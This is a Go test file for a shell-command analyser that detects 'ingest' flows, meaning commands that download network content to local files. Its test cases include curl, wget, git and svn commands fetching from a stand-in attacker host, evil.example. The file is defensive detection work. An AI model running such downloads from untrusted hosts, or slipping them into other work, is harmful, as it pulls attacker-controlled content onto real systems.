package bind_test

import (
	"strings"
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// TestBindIngestMarking pins the binder-side half of the ingest flow: a download
// client's file-output parameter marks its FSWrite as an ingest sink (a
// NetEgress → FSWrite flow), a plain download to stdout does not, and a VCS
// sync (git clone/fetch/pull) never produces an ingest.
func TestBindIngestMarking(t *testing.T) {
	b := newBinder(t)
	cases := []struct {
		src        string
		wantIngest bool
	}{
		{"curl -o f https://evil.example/x", true},            // response body → file
		{"curl -O https://evil.example/x", true},              // remote-name output
		{"wget https://evil.example/x", true},                 // wget writes a file by default
		{"wget -O g https://evil.example/x", true},            // explicit output file
		{"wget -o log https://evil.example/x", true},          // -o is a log; the default download still writes a file
		{"curl https://evil.example/x", false},                // nothing written to a file
		{"curl -o - https://evil.example/x", false},           // stdout, not a file
		{"wget -O - https://evil.example/x", false},           // stdout, not a file
		{"curl -c cookies.txt https://evil.example/x", false}, // cookie jar, not the download
		{"git clone https://evil.example/x", false},           // VCS sync, not an ingest
		{"git fetch origin", false},
		{"git pull", false},
	}
	for _, tc := range cases {
		res := bindOne(t, b, tc.src)
		got := len(engine.DetectIngestFlows(res.Effects)) > 0
		if got != tc.wantIngest {
			t.Errorf("%q: ingest=%v, want %v (effects=%s)", tc.src, got, tc.wantIngest, effectsString(res))
		}
	}
}

// TestBindWgetDefaultDownloadTarget pins that wget's implicit download is named
// after the URL's last path segment — so the synthesised sink is a concrete
// local file, never ⊤ (which would read as an arbitrary write).
func TestBindWgetDefaultDownloadTarget(t *testing.T) {
	b := newBinder(t)
	res := bindOne(t, b, "wget https://evil.example/dir/file.tgz")
	flows := engine.DetectIngestFlows(res.Effects)
	if len(flows) == 0 {
		t.Fatalf("wget default download produced no ingest flow (effects=%s)", effectsString(res))
	}
	for _, f := range flows {
		if f.Sink.Target.IsTop() || f.Sink.Target.IsBottom() {
			t.Errorf("wget ingest sink target must be a concrete file, got %s", f.Sink.Target)
		}
		if !strings.Contains(f.Sink.Target.String(), "file.tgz") {
			t.Errorf("wget ingest sink target %s must name the URL's last segment", f.Sink.Target)
		}
	}
}

// TestBindVCSHasNoIngest pins the explicit exclusion: VCS sync commands that do
// carry a network egress never contribute an ingest sink, so their egress is not
// mistaken for a download of executed/written content.
func TestBindVCSHasNoIngest(t *testing.T) {
	b := newBinder(t)
	for _, src := range []string{
		"git clone https://evil.example/x",
		"git fetch https://evil.example/x",
		"git pull https://evil.example/x",
		"svn checkout https://evil.example/x",
	} {
		res := bindOne(t, b, src)
		if len(engine.DetectIngestFlows(res.Effects)) != 0 {
			t.Errorf("%q: VCS sync must not yield an ingest flow (effects=%s)", src, effectsString(res))
		}
	}
}

// TestBindCurlCookieJarNotIngest pins the precision of the output-flag marking:
// a download client's non-download file outputs (curl's cookie jar -c and
// header dump -D) stay plain FSWrite effects.
func TestBindCurlCookieJarNotIngest(t *testing.T) {
	b := newBinder(t)
	for _, src := range []string{
		"curl -c cookies.txt https://evil.example/x",
		"curl -D headers.txt https://evil.example/x",
	} {
		res := bindOne(t, b, src)
		if _, ok := findEffect(res, engine.KindFSWrite, engine.ModeDirect); !ok {
			t.Fatalf("%q: expected an FSWrite, got %s", src, effectsString(res))
		}
		if len(engine.DetectIngestFlows(res.Effects)) != 0 {
			t.Errorf("%q: a non-download file output must not be an ingest sink", src)
		}
	}
}
